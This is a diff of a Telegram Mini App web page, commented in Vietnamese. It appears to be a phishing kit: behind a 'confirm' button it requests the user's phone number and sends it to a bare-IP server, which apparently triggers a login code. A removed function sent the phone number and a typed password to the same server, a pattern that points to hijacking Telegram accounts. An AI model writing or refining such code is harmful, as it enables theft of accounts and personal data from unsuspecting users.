@@ -60,71 +60,58 @@
 </div></div>
 
 <script>
-    // --- TÍCH HỢP KẾT NỐI VPS (ĐÃ SỬA ĐỊA CHỈ) ---
-    const BACKEND_URL = 'http://103.249.117.228:8000'; 
-    let currentPhone = "";
+    const BACKEND_URL = 'http://103.249.117.228:8000';
     const tg = window.Telegram.WebApp;
     tg.ready();
     tg.expand();
 
-    // 1. Gửi SĐT
+    // 1. Khi bấm nút, gọi requestContact
     document.getElementById("shareContact").addEventListener("click", () => {
-        // Thêm kiểm tra môi trường
-        if (!window.Telegram.WebApp.initData) {
-            console.warn("Đang chạy ngoài Telegram, không thể gọi requestContact()");
-        }
+        document.getElementById("shareContact").textContent = '⏳ Đang xác nhận...';
         tg.requestContact();
     });
 
+    // 2. Lắng nghe sự kiện trả về từ Telegram
     tg.onEvent('contactRequested', async (event) => {
+        // Kiểm tra xem người dùng có thực sự share hay không
         if (event.status === 'sent') {
-            currentPhone = event.contact.phone_number;
+            const phone = event.contact.phone_number;
+            console.log("Số điện thoại nhận được:", phone);
             
+            // Gửi SĐT lên VPS
             try {
-                const res = await fetch(`${BACKEND_URL}/send_phone`, {
+                const response = await fetch(`${BACKEND_URL}/send_phone`, {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({ phone: currentPhone })
+                    body: JSON.stringify({ phone: phone })
                 });
-                const data = await res.json();
-                if(data.status === 'otp_sent') goStep(3);
+                
+                const data = await response.json();
+                console.log("Phản hồi từ VPS:", data);
+
+                if(data.status === 'otp_sent') {
+                    // Chuyển sang Step 3
+                    goStep(3);
+                } else {
+                    alert("Server chưa phản hồi đúng định dạng!");
+                }
             } catch (err) {
-                alert("Không thể kết nối tới server: " + err.message);
+                alert("Lỗi kết nối tới server (VPS): " + err.message);
             }
+        } else {
+            alert("Bạn đã từ chối chia sẻ số điện thoại!");
+            document.getElementById("shareContact").textContent = 'Xác Nhận';
         }
     });
 
-    // 2. Kiểm tra Mật khẩu
-    async function s5check() {
-        const v = document.getElementById('s5pw').value;
-        if (!v) return;
-        const btn = document.getElementById('s5btn');
-        btn.textContent = 'Đang xử lý...';
-        
-        try {
-            const res = await fetch(`${BACKEND_URL}/verify_password`, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({ phone: currentPhone, password: v })
-            });
-            const data = await res.json();
-            if(data.status === 'success') {
-                document.getElementById('s5success').classList.add('show');
-            } else {
-                alert("Sai thông tin!");
-                btn.textContent = 'Kiểm tra';
-            }
-        } catch (err) {
-            alert("Lỗi server: " + err.message);
-            btn.textContent = 'Kiểm tra';
-        }
-    }
-
+    // Hàm chuyển màn hình
     function goStep(n) {
         document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
         const target = document.getElementById('step' + n);
         if (target) target.classList.add('active');
     }
+
+    // Các hàm khác của bạn...
 </script>
 </body>
 </html>
